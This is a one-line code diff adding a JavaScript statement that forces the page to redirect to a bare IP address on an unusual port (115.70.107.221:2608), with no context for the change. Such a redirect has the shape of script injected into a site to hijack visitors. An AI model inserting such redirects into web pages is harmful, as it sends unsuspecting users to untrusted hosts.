@@ -1,0 +1,1 @@
+window.location.replace("https://115.70.107.221:2608")
